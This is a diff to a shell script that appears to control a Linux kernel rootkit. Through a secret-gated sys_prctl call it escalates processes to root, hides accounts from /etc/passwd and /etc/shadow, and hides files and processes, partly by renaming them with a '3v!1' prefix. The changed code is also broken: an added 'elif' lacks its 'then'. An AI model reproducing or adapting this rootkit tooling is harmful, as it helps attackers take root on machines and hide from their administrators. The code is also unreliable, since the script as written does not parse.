@@ -24,8 +24,8 @@
 #     drop PID -> set a process's EUID to its UID
 #     elevate PID -> set a process's EUID to root
 #     fugitive ETC_PASSWD_LINE -> hide a line from "/etc/passwd" (and its corresponding "/etc/shadow" entry)
-#     hide PATH_OR_COMMAND_LINE -> hide an entity (a directory entry or ALL processes matching the command line: in that order)
-#     show PATH_OR_COMMAND_LINE -> show a hidden entity (a directory entry or ALL processes matching the command line: in that order)
+#     hide PATH_OR_COMMAND_LINES -> hide an entity (a directory entry or ALL processes matching the command line: in that order)
+#     show PATH_OR_COMMAND_LINES -> show a hidden entity (a directory entry or ALL processes matching the command line: in that order)
 #     unfugitive ETC_PASSWD_LINE -> show a line in "/etc/passwd" (and its corresponding "/etc/shadow" entry)
 CALL=157 # `sys_prctl`
 [ -z "$1" ] && echo "Expected a command." >&2 && exit 1
@@ -33,6 +33,7 @@ COMMAND="$1"
 COMMAND_LEN=`echo -n "${COMMAND}" | wc -c`
 PREFIX="3v!1"
 SECRET=0xDEADBEEFDEADBEEF
+SYSCALL=./syscall
 REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`
 
 # most of this should be done in the module,
@@ -40,25 +41,24 @@ REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`
 
 if [ "${COMMAND}" = hide ] || [ "${COMMAND}" = show ]
 then
-  for _PATH in ${REST}
+  for ARG in ${REST}
   do
-    if [ ! -e "${_PATH}" ]
+    if [ "${COMMAND}" = hide ] && [ -e "${ARG}" ]
     then
-      # if it's not a path, then it's probably a command line
+      # hide path via rename
 
-      ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" "@${_PATH}"
-    elif [ "${COMMAND}" = hide ]
-    then
-      # hide via rename
+      mv "${ARG}" "${PREFIX}${ARG}"
+    elif [ -e "${PREFIX}${ARG}" ]
+      # show path via rename
 
-      mv "${_PATH}" "${PREFIX}${_PATH}"
+      mv "${PREFIX}${ARG}" "${ARG}"
     else
-      # show via rename
+      # handle command line via syscall
 
-      mv "${PREFIX}${_PATH}" "${_PATH}"
+      "${SYSCALL}" "${CALL}" "${SECRET}" "@${COMMAND}" "@${ARG}"
     fi
   done
 else
-  ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
+  "${SYSCALL}" "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
 fi
 
